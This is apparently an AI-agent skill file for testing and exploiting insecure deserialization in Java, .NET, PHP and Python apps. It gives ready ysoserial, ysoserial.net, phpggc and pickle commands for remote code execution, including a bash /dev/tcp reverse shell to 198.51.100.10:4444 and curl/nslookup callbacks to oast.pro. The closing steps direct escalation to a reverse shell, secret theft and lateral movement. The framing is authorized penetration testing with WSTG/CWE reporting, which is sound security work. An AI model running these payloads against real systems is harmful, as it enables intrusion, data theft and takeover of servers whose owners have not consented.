---
name: deserialization-testing
description: Find and exploit insecure deserialization (WSTG-INPV-19, CWE-502) across Java, .NET, PHP, and Python — spot serialized blobs (rO0/ac ed, __VIEWSTATE/AAEAAAD, PHP O:/a:, pickle \x80) in cookies/params/headers/uploads, confirm sinks with URLDNS/interactsh OOB callbacks, then build RCE payloads with ysoserial, ysoserial.net, phpggc, and raw pickle gadgets; use whenever an app round-trips opaque base64/binary state through the client or a queue.
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: WSTG-INPV-19
  cwe: CWE-502
---

# Insecure Deserialization Testing

An app that deserializes attacker-controlled bytes executes attacker-chosen
gadget chains. Method: **spot the format → confirm the sink (OOB first) →
build a gadget payload matched to the classpath/formatter → deliver → RCE**.

## 1. Spot sinks & formats

Hunt serialized blobs in: cookies (session/remember-me), hidden form fields
(`__VIEWSTATE`), query/body params, custom headers, file uploads, WebSocket
and message-queue payloads (JMS/AMQP), cached objects, JWT claims wrapping a
blob. Magic bytes (full table in `references/detection.md`):

| Language | Raw | Base64 prefix |
|---|---|---|
| Java | `ac ed 00 05` | `rO0AB` (gzipped: `H4sIA` → decompress, re-check) |
| .NET BinaryFormatter | `00 01 00 00 00 ff ff ff ff` | `AAEAAAD/////` |
| .NET ViewState (LosFormatter) | — | `/wEP…` in `__VIEWSTATE` |
| PHP | text `O:4:"User":…` / `a:3:{…}` / `s:5:"…"` | base64 of same |
| Python pickle | `\x80\x02`–`\x80\x05`, proto-0 text ending `.` | `gAJ`/`gAN`/`gASV` |
| Ruby Marshal | `\x04\x08` | `BAh` |

Automate over captured traffic (raw requests, Burp/ZAP exports, cookie jars):

```
python3 scripts/detect_serialized.py scan -i captured/*.txt --work-units deser-units.json
```

It URL-decodes, base64-sniffs (nested, incl. gzip), classifies the format,
attributes each blob to its location (cookie/param/header), suggests the tool
and first probe, and writes the rupu work-units array (see `references/rupu.md`).

## 2. Confirm the sink blind — OOB before gadgets

Most deserialization is blind. Prove bytes reach a deserializer before
burning time on gadget selection:

```
interactsh-client -json -o oast.json          # note your <id>.oast.pro
java -jar ysoserial.jar URLDNS 'http://<id>.oast.pro/' > urldns.bin
base64 -w0 urldns.bin                          # encode to match the sink
```

**URLDNS needs no third-party classes on the classpath** — any Java
`ObjectInputStream.readObject()` on it triggers a DNS lookup. A DNS-only hit
in `oast.json` = confirmed Java sink. Equivalents: pickle `__reduce__` with
`nslookup <id>.oast.pro`; phpggc chains running `curl http://<id>.oast.pro`;
ysoserial.net with a `nslookup` command. Secondary oracles: a corrupted blob
(flip one byte) yielding a 500/`ClassNotFoundException`/`unserialize(): Error`
vs the original's 200 proves parsing; exception class names leak the library.

## 3. Java — ysoserial (`references/java.md`)

```
java -jar ysoserial.jar                               # list gadgets
java -jar ysoserial.jar CommonsCollections6 'curl http://<id>.oast.pro' > cc6.bin
java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i},>&,/dev/tcp/198.51.100.10/4444,0>&1' > shell.bin
```

Gadget choice is a **classpath question**: CC1/3/5/6 need commons-collections
3.1; CC2/4 need commons-collections4; Groovy1 needs groovy 2.3.9; Spring1/2
need spring-core/beans; CB1 commons-beanutils — full map in the reference.
When blind, spray URLDNS first, then iterate gadgets each with a distinct
OAST subdomain (`cc6.<id>.oast.pro`) so the hit names the working chain.
Commands run via `Runtime.exec` — no shell metachars; use the
`bash -c {cmd,arg}` comma form or base64-wrapped `bash -c`.
RMI/JRMP sinks: `ysoserial.exploit.RMIRegistryExploit`, `JRMPListener`,
`JRMPClient` (reference has invocations). Encode payloads to match transport
(base64, URL-safe base64, gzip+base64) exactly as the original blob was.

## 4. .NET — ysoserial.net (`references/dotnet-php-python.md`)

```
ysoserial.exe -g ObjectDataProvider -f Json.Net -o base64 -c "nslookup <id>.oast.pro"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "cmd /c whoami"
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" --validationkey="<machineKey>" \
  --generator=ABCD1234 -c "nslookup <id>.oast.pro"      # __VIEWSTATE with leaked machineKey
```

Formatter must match the sink: BinaryFormatter/LosFormatter/SoapFormatter for
binary blobs, Json.Net for `TypeNameHandling != None` JSON. ViewState without
MAC, or with a leaked/default machineKey, is direct RCE via `-p ViewState`.

## 5. PHP — unserialize() / phpggc (`references/dotnet-php-python.md`)

```
phpggc -l monolog                       # list chains (filter)
phpggc Monolog/RCE1 system id           # chain + function + arg
phpggc -b -f Laravel/RCE1 system id     # -f fast-destruct FIRST, then -b base64
phpggc -u --fast-destruct Monolog/RCE1 system 'curl http://<id>.oast.pro'   # URL-encoded
phpggc -p phar -o out.phar Monolog/RCE1 system id        # PHAR for phar:// sinks
phpggc -pj cat.jpg -o poly.jpg Monolog/RCE1 system id    # JPEG/PHAR polyglot upload
```

Encoders apply left-to-right; `-f/--fast-destruct` (forces `__destruct` even
on early exit) must come before encoders. No phpggc chain for the app's
libs? Read its classes for `__wakeup/__destruct/__toString/__call` gadgets and
hand-craft the object graph (worked example in the reference). Any
file-operation on a `phar://` path (`file_exists`, `getimagesize`) deserializes
the PHAR metadata — pair with upload functionality.

## 6. Python pickle (`references/dotnet-php-python.md`)

Any `pickle.loads()` of attacker bytes is RCE — `__reduce__` returns a
callable+args executed during load:

```python
import pickle, base64, os
class G:
    def __reduce__(self):
        return (os.system, ("nslookup <id>.oast.pro",))
print(base64.b64encode(pickle.dumps(G())).decode())
```

Match the container exactly (plain b64, URL-safe, inside a signed Flask/Django
session — forge with the leaked SECRET_KEY). picklescan/blocklist "defenses"
are bypassable (alternate callables, `builtins.exec`, bytecode tricks) and are
never a reason to downgrade the finding.

## 7. Deliver, verify, report

Deliver the payload in the blob's original seat (cookie value, `__VIEWSTATE`
field, upload) with identical encoding layers. Verification = OAST hit,
command output in a response/error, time delta (`ping -c 5 127.0.0.1` /
`timeout 5`), or a dropped file. Then escalate: reverse shell, secrets, lateral.

## 8. rupu wiring (required at every parse/handoff step)

Shapes in `references/rupu.md`.

1. **Scan parse** → `detect_serialized.py scan --work-units deser-units.json`
   emits the JSON array of sinks; normalize/fan out via the `work-units` skill.
2. **Coverage** → per the `coverage-assets` skill, `assets.mark` each sink's
   route as `web:route` (param coordinate = cookie/field name): `crawled` when
   discovered, `tested` once payloads were delivered, `exploited` on a
   confirmed callback/RCE.
3. **Findings** → every confirmed sink/RCE via the `finding-report` skill /
   `findings.report`: scope `endpoint`, `target_ref` = sink URL, severity
   `critical` (RCE/callback) or `high` (parse-oracle only), classification
   `WSTG-INPV-19` + `CWE-502`, evidence = delivery request + callback/response.
   `detect_serialized.py report ...` builds the exact payload.

## References

- `references/detection.md` — full marker/encoding table, where blobs hide, decode pipeline.
- `references/java.md` — ysoserial gadget→dependency map, Runtime.exec quirks, RMI/JRMP exploit classes.
- `references/dotnet-php-python.md` — ysoserial.net formatters/plugins, phpggc, pickle gadgets, Ruby Marshal.
- `references/rupu.md` — work-unit, assets.mark, findings.report shapes.
